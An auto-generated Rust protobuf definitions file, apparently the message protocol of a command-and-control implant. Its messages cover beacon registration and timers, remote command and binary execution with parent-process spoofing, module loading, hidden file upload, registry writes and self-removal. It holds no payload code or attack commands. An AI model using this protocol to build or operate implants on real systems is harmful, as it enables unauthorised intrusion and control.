// This file is @generated by prost-build.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct Empty {}
/// implant call and back data
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Spite {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(uint32, tag = "2")]
    pub task_id: u32,
    #[prost(bool, tag = "3")]
    pub r#async: bool,
    #[prost(uint64, tag = "4")]
    pub timeout: u64,
    #[prost(uint32, tag = "5")]
    pub error: u32,
    #[prost(message, optional, tag = "6")]
    pub status: ::core::option::Option<Status>,
    #[prost(
        oneof = "spite::Body",
        tags = "10, 11, 13, 20, 21, 22, 23, 24, 25, 31, 32, 35, 36, 37, 42, 101, 102, 104, 105, 106, 107, 121, 108, 109, 110, 116, 117, 118, 119, 123"
    )]
    pub body: ::core::option::Option<spite::Body>,
}
/// Nested message and enum types in `Spite`.
pub mod spite {
    #[allow(clippy::derive_partial_eq_without_eq)]
    #[derive(Clone, PartialEq, ::prost::Oneof)]
    pub enum Body {
        #[prost(message, tag = "10")]
        Empty(super::Empty),
        #[prost(message, tag = "11")]
        Block(super::Block),
        #[prost(message, tag = "13")]
        AsyncAck(super::AsyncAck),
        #[prost(message, tag = "20")]
        Sysinfo(super::SysInfo),
        #[prost(message, tag = "21")]
        Register(super::Register),
        #[prost(message, tag = "22")]
        Ping(super::Ping),
        #[prost(message, tag = "23")]
        Suicide(super::Suicide),
        #[prost(message, tag = "24")]
        Request(super::Request),
        #[prost(message, tag = "25")]
        Response(super::Response),
        #[prost(message, tag = "31")]
        LoadModule(super::LoadModule),
        #[prost(message, tag = "32")]
        Modules(super::Modules),
        #[prost(message, tag = "35")]
        LoadExtension(super::LoadExtension),
        #[prost(message, tag = "36")]
        Extensions(super::Extensions),
        #[prost(message, tag = "37")]
        ExecuteExtension(super::ExecuteExtension),
        #[prost(message, tag = "42")]
        ExecuteBinary(super::ExecuteBinary),
        ///     ExecuteExtension execute_extension = 42;
        #[prost(message, tag = "101")]
        LsResponse(super::LsResponse),
        #[prost(message, tag = "102")]
        ChownRequest(super::ChownRequest),
        #[prost(message, tag = "104")]
        ExecRequest(super::ExecRequest),
        #[prost(message, tag = "105")]
        ExecResponse(super::ExecResponse),
        #[prost(message, tag = "106")]
        UploadRequest(super::UploadRequest),
        #[prost(message, tag = "107")]
        DownloadRequest(super::DownloadRequest),
        #[prost(message, tag = "121")]
        DownloadResponse(super::DownloadResponse),
        #[prost(message, tag = "108")]
        PsResponse(super::PsResponse),
        #[prost(message, tag = "109")]
        NetstatResponse(super::NetstatResponse),
        #[prost(message, tag = "110")]
        AssemblyResponse(super::AssemblyResponse),
        ///     ExecuteAssembly execute_assembly = 111;
        ///     ExecuteBof execute_bof = 112;
        ///     ExecuteSideLoad execute_sideload = 113;
        ///     ExecuteSpawn execute_spawn = 114;
        ///     ExecuteShellcode execute_shellcode = 115;
        #[prost(message, tag = "116")]
        RegistryRequest(super::RegistryRequest),
        #[prost(message, tag = "117")]
        RegistryWriteRequest(super::RegistryWriteRequest),
        #[prost(message, tag = "118")]
        IfconfigResponse(super::IfconfigResponse),
        #[prost(message, tag = "119")]
        CurlRequest(super::CurlRequest),
        ///     ExecutePowershell execute_powershell = 120;
        ///     ExecutePE execute_pe = 122;
        #[prost(message, tag = "123")]
        ExecuteCommand(super::ExecuteCommand),
    }
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Spites {
    #[prost(message, repeated, tag = "1")]
    pub spites: ::prost::alloc::vec::Vec<Spite>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Status {
    #[prost(uint32, tag = "1")]
    pub task_id: u32,
    /// unexcept error
    #[prost(int32, tag = "2")]
    pub status: i32,
    /// std err
    #[prost(string, tag = "3")]
    pub error: ::prost::alloc::string::String,
    #[prost(oneof = "status::Msg", tags = "4")]
    pub msg: ::core::option::Option<status::Msg>,
}
/// Nested message and enum types in `Status`.
pub mod status {
    #[allow(clippy::derive_partial_eq_without_eq)]
    #[derive(Clone, PartialEq, ::prost::Oneof)]
    pub enum Msg {
        #[prost(string, tag = "4")]
        Output(::prost::alloc::string::String),
    }
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct Ping {
    #[prost(int32, tag = "1")]
    pub nonce: i32,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Register {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub proxy: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "3")]
    pub module: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
    #[prost(message, optional, tag = "4")]
    pub extension: ::core::option::Option<Extensions>,
    #[prost(message, optional, tag = "5")]
    pub timer: ::core::option::Option<Timer>,
    #[prost(message, optional, tag = "11")]
    pub sysinfo: ::core::option::Option<SysInfo>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct SysInfo {
    #[prost(string, tag = "1")]
    pub filepath: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub workdir: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "11")]
    pub os: ::core::option::Option<Os>,
    #[prost(message, optional, tag = "12")]
    pub process: ::core::option::Option<Process>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct Suicide {
    #[prost(int32, tag = "1")]
    pub r#type: i32,
    #[prost(int64, tag = "2")]
    pub timestamp: i64,
}
/// common empty request
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Request {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub input: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "3")]
    pub args: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
    #[prost(map = "string, string", tag = "4")]
    pub params: ::std::collections::HashMap<
        ::prost::alloc::string::String,
        ::prost::alloc::string::String,
    >,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Response {
    #[prost(string, tag = "1")]
    pub output: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub error: ::prost::alloc::string::String,
    #[prost(map = "string, string", tag = "3")]
    pub kv: ::std::collections::HashMap<
        ::prost::alloc::string::String,
        ::prost::alloc::string::String,
    >,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct NetInterface {
    #[prost(int32, tag = "1")]
    pub index: i32,
    #[prost(string, tag = "2")]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    pub mac: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "4")]
    pub ip_addresses: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct SockTabEntry {
    #[prost(string, tag = "1")]
    pub local_addr: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub remote_addr: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    pub sk_state: ::prost::alloc::string::String,
    ///   uint32 uid = 4;
    #[prost(string, tag = "5")]
    pub pid: ::prost::alloc::string::String,
    #[prost(string, tag = "6")]
    pub protocol: ::prost::alloc::string::String,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct NetstatResponse {
    #[prost(message, repeated, tag = "1")]
    pub socks: ::prost::alloc::vec::Vec<SockTabEntry>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Block {
    #[prost(uint32, tag = "1")]
    pub block_id: u32,
    #[prost(bytes = "vec", tag = "2")]
    pub content: ::prost::alloc::vec::Vec<u8>,
    #[prost(bool, tag = "3")]
    pub end: bool,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct AsyncAck {
    #[prost(uint32, tag = "1")]
    pub id: u32,
    #[prost(bool, tag = "2")]
    pub success: bool,
    #[prost(bool, tag = "3")]
    pub end: bool,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Os {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    /// kernel version
    #[prost(string, tag = "2")]
    pub version: ::prost::alloc::string::String,
    /// release version
    #[prost(string, tag = "3")]
    pub release: ::prost::alloc::string::String,
    #[prost(string, tag = "4")]
    pub arch: ::prost::alloc::string::String,
    #[prost(string, tag = "5")]
    pub username: ::prost::alloc::string::String,
    #[prost(string, tag = "6")]
    pub hostname: ::prost::alloc::string::String,
    /// timezone
    #[prost(string, tag = "7")]
    pub locale: ::prost::alloc::string::String,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Process {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(uint32, tag = "2")]
    pub pid: u32,
    #[prost(uint32, tag = "3")]
    pub ppid: u32,
    #[prost(string, tag = "4")]
    pub owner: ::prost::alloc::string::String,
    #[prost(string, tag = "5")]
    pub arch: ::prost::alloc::string::String,
    #[prost(string, tag = "6")]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "7")]
    pub args: ::prost::alloc::string::String,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct Timer {
    #[prost(uint64, tag = "1")]
    pub interval: u64,
    #[prost(uint64, tag = "2")]
    pub jitter: u64,
    #[prost(uint64, tag = "3")]
    pub heartbeat: u64,
    #[prost(uint64, tag = "4")]
    pub last_checkin: u64,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct FileInfo {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(bool, tag = "2")]
    pub is_dir: bool,
    #[prost(uint64, tag = "3")]
    pub size: u64,
    #[prost(int64, tag = "4")]
    pub mod_time: i64,
    #[prost(uint32, tag = "5")]
    pub mode: u32,
    #[prost(string, tag = "6")]
    pub link: ::prost::alloc::string::String,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct SacrificeProcess {
    #[prost(bool, tag = "1")]
    pub output: bool,
    #[prost(bool, tag = "2")]
    pub block_dll: bool,
    #[prost(uint32, tag = "3")]
    pub ppid: u32,
    #[prost(string, tag = "4")]
    pub argue: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "5")]
    pub params: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct LsResponse {
    #[prost(string, tag = "1")]
    pub path: ::prost::alloc::string::String,
    #[prost(bool, tag = "2")]
    pub exists: bool,
    #[prost(message, repeated, tag = "3")]
    pub files: ::prost::alloc::vec::Vec<FileInfo>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct PsResponse {
    #[prost(message, repeated, tag = "1")]
    pub processes: ::prost::alloc::vec::Vec<Process>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecRequest {
    #[prost(string, tag = "1")]
    pub path: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "2")]
    pub args: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
    #[prost(bool, tag = "3")]
    pub output: bool,
    #[prost(string, tag = "4")]
    pub stdout: ::prost::alloc::string::String,
    #[prost(string, tag = "5")]
    pub stderr: ::prost::alloc::string::String,
    #[prost(uint32, tag = "10")]
    pub ppid: u32,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecResponse {
    #[prost(int32, tag = "1")]
    pub status_code: i32,
    #[prost(bytes = "vec", tag = "2")]
    pub stdout: ::prost::alloc::vec::Vec<u8>,
    #[prost(bytes = "vec", tag = "3")]
    pub stderr: ::prost::alloc::vec::Vec<u8>,
    #[prost(uint32, tag = "4")]
    pub pid: u32,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecSacrificeRequest {
    #[prost(string, tag = "1")]
    pub path: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "2")]
    pub sacrifice: ::core::option::Option<SacrificeProcess>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Modules {
    #[prost(string, repeated, tag = "1")]
    pub modules: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Extensions {
    #[prost(message, repeated, tag = "1")]
    pub extensions: ::prost::alloc::vec::Vec<Extension>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Extension {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub r#type: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    pub depend: ::prost::alloc::string::String,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct LoadModule {
    #[prost(string, tag = "1")]
    pub bundle: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "2")]
    pub bin: ::prost::alloc::vec::Vec<u8>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct LoadExtension {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub r#type: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    pub depend: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "4")]
    pub bin: ::prost::alloc::vec::Vec<u8>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecuteExtension {
    #[prost(string, tag = "1")]
    pub extension: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "2")]
    pub execute_binary: ::core::option::Option<ExecuteBinary>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecuteBinary {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "2")]
    pub bin: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag = "4")]
    pub r#type: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "5")]
    pub params: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
    #[prost(string, tag = "6")]
    pub entry_point: ::prost::alloc::string::String,
    #[prost(bool, tag = "7")]
    pub output: bool,
    #[prost(message, optional, tag = "10")]
    pub sacrifice: ::core::option::Option<SacrificeProcess>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct AssemblyResponse {
    #[prost(bytes = "vec", tag = "1")]
    pub data: ::prost::alloc::vec::Vec<u8>,
    #[prost(int32, tag = "2")]
    pub status: i32,
    #[prost(string, tag = "3")]
    pub err: ::prost::alloc::string::String,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecuteCommand {
    #[prost(string, tag = "1")]
    pub command: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "2")]
    pub sacrifice: ::core::option::Option<SacrificeProcess>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct UploadRequest {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub target: ::prost::alloc::string::String,
    #[prost(uint32, tag = "3")]
    pub r#priv: u32,
    #[prost(bytes = "vec", tag = "4")]
    pub data: ::prost::alloc::vec::Vec<u8>,
    #[prost(bool, tag = "5")]
    pub hidden: bool,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct DownloadRequest {
    #[prost(string, tag = "1")]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub name: ::prost::alloc::string::String,
    #[prost(uint32, tag = "3")]
    pub buffer_size: u32,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct DownloadResponse {
    #[prost(string, tag = "1")]
    pub checksum: ::prost::alloc::string::String,
    #[prost(uint64, tag = "2")]
    pub size: u64,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct CurlRequest {
    #[prost(string, tag = "1")]
    pub url: ::prost::alloc::string::String,
    #[prost(int32, tag = "2")]
    pub timeout: i32,
    #[prost(string, tag = "3")]
    pub method: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "4")]
    pub body: ::prost::alloc::vec::Vec<u8>,
    #[prost(map = "string, string", tag = "5")]
    pub header: ::std::collections::HashMap<
        ::prost::alloc::string::String,
        ::prost::alloc::string::String,
    >,
    #[prost(string, tag = "6")]
    pub hostname: ::prost::alloc::string::String,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ChownRequest {
    #[prost(string, tag = "1")]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub uid: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    pub gid: ::prost::alloc::string::String,
    #[prost(bool, tag = "4")]
    pub recursive: bool,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct IfconfigResponse {
    #[prost(message, repeated, tag = "1")]
    pub net_interfaces: ::prost::alloc::vec::Vec<NetInterface>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct RegistryRequest {
    #[prost(string, tag = "1")]
    pub hive: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    pub key: ::prost::alloc::string::String,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct RegistryWriteRequest {
    #[prost(string, tag = "1")]
    pub hive: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    pub key: ::prost::alloc::string::String,
    #[prost(string, tag = "5")]
    pub string_value: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "6")]
    pub byte_value: ::prost::alloc::vec::Vec<u8>,
    #[prost(uint32, tag = "7")]
    pub dword_value: u32,
    #[prost(uint64, tag = "8")]
    pub qword_value: u64,
    #[prost(uint32, tag = "10")]
    pub r#type: u32,
}
